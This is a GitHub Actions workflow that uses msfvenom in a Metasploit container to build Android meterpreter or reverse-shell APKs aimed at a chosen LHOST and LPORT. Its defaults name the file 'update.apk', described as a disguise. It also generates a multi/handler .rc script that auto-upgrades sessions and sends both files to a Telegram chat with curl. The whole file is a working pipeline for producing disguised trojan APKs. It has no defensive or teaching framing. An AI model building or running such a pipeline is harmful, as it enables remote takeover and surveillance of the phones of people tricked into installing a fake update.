name: Build MSF Payload

on:
  workflow_dispatch:
    inputs:
      payload:
        description: "Payload type"
        required: true
        type: choice
        default: "android/meterpreter/reverse_tcp"
        options:
          - android/meterpreter/reverse_tcp
          - android/meterpreter/reverse_tcp_ssl
          - android/meterpreter/reverse_http
          - android/meterpreter/reverse_https
          - android/meterpreter_reverse_tcp
          - android/meterpreter_reverse_http
          - android/meterpreter_reverse_https
          - android/shell/reverse_tcp
          - android/shell/reverse_http
          - android/shell/reverse_https
      lhost:
        description: "LHOST — public IP/domain your handler listens on"
        required: true
      lport:
        description: "LPORT"
        required: true
        default: "4444"
      filename:
        description: "Output APK name (disguise)"
        required: true
        default: "update.apk"
      send_rc:
        description: "Also send handler .rc file to Telegram"
        required: true
        type: boolean
        default: true

env:
  IMAGE: "metasploitframework/metasploit-framework:latest"

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 25

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Resolve + validate parameters
        id: p
        run: |
          LHOST="${{ github.event.inputs.lhost || secrets.LHOST }}"
          LPORT="${{ github.event.inputs.lport || secrets.LPORT || '4444' }}"
          PAYLOAD="${{ github.event.inputs.payload || 'android/meterpreter/reverse_tcp' }}"
          FNAME="${{ github.event.inputs.filename || 'update.apk' }}"
          SEND_RC="${{ github.event.inputs.send_rc || 'true' }}"

          [ -z "$LHOST" ] && { echo "::error::LHOST missing"; exit 1; }

          case "$PAYLOAD" in
            android/meterpreter/reverse_tcp|android/meterpreter/reverse_tcp_ssl|\
            android/meterpreter/reverse_http|android/meterpreter/reverse_https|\
            android/meterpreter_reverse_tcp|android/meterpreter_reverse_http|\
            android/meterpreter_reverse_https|\
            android/shell/reverse_tcp|android/shell/reverse_http|android/shell/reverse_https) ;;
            *) echo "::error::Unsupported payload: $PAYLOAD"; exit 1 ;;
          esac

          echo "lhost=$LHOST"     >> "$GITHUB_OUTPUT"
          echo "lport=$LPORT"     >> "$GITHUB_OUTPUT"
          echo "payload=$PAYLOAD" >> "$GITHUB_OUTPUT"
          echo "fname=$FNAME"     >> "$GITHUB_OUTPUT"
          echo "send_rc=$SEND_RC" >> "$GITHUB_OUTPUT"

      - name: Pull Metasploit image
        run: docker pull "$IMAGE"

      - name: Build payload
        run: |
          mkdir -p out
          docker run --rm -v "$PWD/out:/work" "$IMAGE" \
            ./msfvenom \
              -p "${{ steps.p.outputs.payload }}" \
              LHOST="${{ steps.p.outputs.lhost }}" \
              LPORT="${{ steps.p.outputs.lport }}" \
              --platform android \
              -a dalvik \
              -o "/work/${{ steps.p.outputs.fname }}"
          ls -lh out/

      - name: Verify APK
        run: |
          APK="out/${{ steps.p.outputs.fname }}"
          test -s "$APK" || { echo "::error::APK empty"; exit 1; }
          unzip -l "$APK" | grep -q AndroidManifest.xml || { echo "::error::Not a valid APK"; exit 1; }
          echo "APK OK: $(du -h "$APK" | cut -f1)"

      - name: Build handler rc
        run: |
          RC="out/handler-${{ steps.p.outputs.lport }}.rc"
          {
            echo "use multi/handler"
            echo "set PAYLOAD ${{ steps.p.outputs.payload }}"
            echo "set LHOST ${{ steps.p.outputs.lhost }}"
            echo "set LPORT ${{ steps.p.outputs.lport }}"
            echo "set ExitOnSession false"
            echo "set AutoRunScript post/multi/manage/shell_to_meterpreter"
            echo "exploit -j"
          } > "$RC"
          cat "$RC"

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: msf-payload
          path: out/
          retention-days: 7

      - name: Send to Telegram
        env:
          TG_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          APK="out/${{ steps.p.outputs.fname }}"
          RC="out/handler-${{ steps.p.outputs.lport }}.rc"
          CAPTION=$(printf 'APK ready\npayload: %s\nLHOST: %s\nLPORT: %s\nsize: %s' \
            "${{ steps.p.outputs.payload }}" "${{ steps.p.outputs.lhost }}" \
            "${{ steps.p.outputs.lport }}" "$(du -h "$APK" | cut -f1)")

          curl -sS --fail-with-body \
            -F "chat_id=${TG_CHAT}" \
            -F "caption=${CAPTION}" \
            -F "document=@${APK};type=application/vnd.android.package-archive" \
            "https://api.telegram.org/bot${TG_TOKEN}/sendDocument"

          if [ "${{ steps.p.outputs.send_rc }}" = "true" ]; then
            curl -sS --fail-with-body \
              -F "chat_id=${TG_CHAT}" \
              -F "document=@${RC}" \
              "https://api.telegram.org/bot${TG_TOKEN}/sendDocument"
          fi
